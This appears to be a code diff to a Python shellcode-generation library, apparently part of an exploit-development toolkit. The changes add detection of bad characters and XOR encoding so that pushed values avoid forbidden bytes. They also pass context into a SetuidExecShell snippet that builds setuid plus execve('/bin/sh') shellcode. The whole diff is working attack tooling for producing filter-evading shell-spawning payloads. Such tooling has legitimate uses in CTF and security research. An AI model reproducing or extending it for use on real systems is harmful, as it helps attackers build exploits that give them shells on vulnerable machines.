@@ -4,9 +4,9 @@ import tempfile
 import subprocess
 import struct
 
-from cryptutils import md5
+from cryptutils import md5, xor
 from langutils import switch
-from textutils import chunkstring
+from textutils import chunkstring, hexdump, d, unpack32
 import config
 from constants import *
 
@@ -54,6 +54,9 @@ def assemble(code, cpu=None, printerrors=True):
 class NotSupportedException(Exception):
 	def __init__(self, cpu=None, OS=None):
 		super(NotSupportedException, self).__init__("Arch %s/%s not supported"%(cpu, OS))
+class BadCharException(Exception):
+	def __init__(self, shellcode, badchar):
+		Exception.__init__(self, "shellcode contains bad char %s"%(repr(badchar),))
 
 class _Register_Content(object):
 	pass
@@ -65,10 +68,11 @@ REG_RESERVED=_Register_Content()
 class Context(object):
 	cpu = None
 	os = None
+	badchars = ""
 	syscalls = None
 	all_registers = None
 	state = None
-	def __init__(self, cpu=None, OS=None):
+	def __init__(self, cpu=None, OS=None, badchars=""):
 		if cpu is not None:
 			self.cpu = cpu
 		else:
@@ -77,6 +81,7 @@ class Context(object):
 			self.os = OS
 		else:
 			self.os = config.os()
+		self.badchars = badchars
 		self.syscalls=syscalls[self.cpu][self.os]
 		if(self.cpu == "x86"):
 			self.all_registers = ["eax","ebx","ecx","edx","esi","edi","ebp","esp"]
@@ -100,6 +105,33 @@ class ShellcodeSnippet(object):
 		elif len(args) > self.maxparams or len(args) < self.minparams:
 			raise Exception("Incorrect parameters number (given %d, expected [%d-%d])"%(len(args), self.minparams, self.maxparams))
 		self.args = args
+	def has_badchar(self, value):
+		for i in d(value):
+			if i in self.ctx.badchars:
+				return True
+		return False
+	def get_xor(self, value):
+		"""find a xored value (in registers or generated) that will not conflict with badchars"""
+		for reg, v in self.ctx.state.items():
+			if not type(v) == int:
+				continue
+			for i in self.ctx.badchars:
+				if i in xor(d(value), d(v)):
+					continue
+				return reg, value ^ v
+		# nothing useful found in registers
+		xored1 = ""
+		value = d(value)
+		for clear in value:
+			for i in xrange(256):
+				if not chr(i) in self.ctx.badchars and not xor(chr(i), clear) in self.ctx.badchars:
+					xored1 += chr(i)
+					break
+		if len(xored1) != len(value):
+			raise Exception("Could not find a xor value to match badchars")
+		xored2 = xor(xored1, value)
+		return unpack32(xored1), unpack32(xored2)
+
 	def generate_x86(self):
 		return None
 	def generate_amd64(self):
@@ -148,6 +180,10 @@ class ShellcodeSnippet(object):
 	def assemble(self):
 		src = self.generate()
 		asm = assemble(src, cpu=self.ctx.cpu)
+		for i in self.ctx.badchars:
+			if i in asm:
+				hexdump(asm, highlight=i)
+				raise BadCharException(asm, i)
 		return asm
 	def __str__(self):
 		return self.assemble()
@@ -161,14 +197,32 @@ class PushArray(ShellcodeSnippet):
 		#make a copy
 		array = list(self.args[0])
 		dest = self.args[1]
-		self.ctx.state[dest]=REG_RESERVED
 		array.reverse()
 		for v in array:
 			if v in self.ctx.all_registers:
 				code += "push %s\n"%(v)
+			# check if value already in register
+			elif v in self.ctx.state.values():
+				for reg,j in self.ctx.state.items():
+					if v == j:
+						code += "push %s\n"%(reg)
+						break
+			elif self.has_badchar(v):
+				xor1,xor2 = self.get_xor(v)
+				if xor1 in self.ctx.all_registers:
+					code += "xor %s, %d\n"%(xor1, xor2)
+					code += "push %s\n"%(dest)
+					self.ctx.state[xor1] = v
+				else:
+					code += "mov %s, %d\n"%(dest, xor1)
+					code += "xor %s, %d\n"%(dest, xor2)
+					code += "push %s\n"%(dest)
+					self.ctx.state[dest] = v
 			else:
 				code += "push %d\n"%(v)
 		code += "mov %s, esp\n"%(dest)
+		self.ctx.state[dest]=REG_RESERVED
+
 		return code
 
 class PushString(ShellcodeSnippet):
@@ -314,8 +368,8 @@ class Execve(ShellcodeSnippet):
 class SetuidExecShell(ShellcodeSnippet):
 	"""setuid(getuid) + execve("/bin/sh") shellcode"""
 	def generate_x86(self):
-		code = Getuid().generate()
-		code += SetRegisters(("ebx","eax")).generate()
-		code += Setuid("ebx").generate()
-		code += Execve("/bin/sh").generate()
+		code = Getuid(ctx=self.ctx).generate()
+		code += SetRegisters(("ebx","eax"), ctx=self.ctx).generate()
+		code += Setuid("ebx", ctx=self.ctx).generate()
+		code += Execve("/bin/sh", ctx=self.ctx).generate()
 		return code
